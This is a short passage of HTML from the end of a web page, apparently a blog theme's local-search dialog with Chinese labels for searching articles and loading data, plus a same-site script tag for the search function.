+})()</script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.2"></script></div></div></body></html>
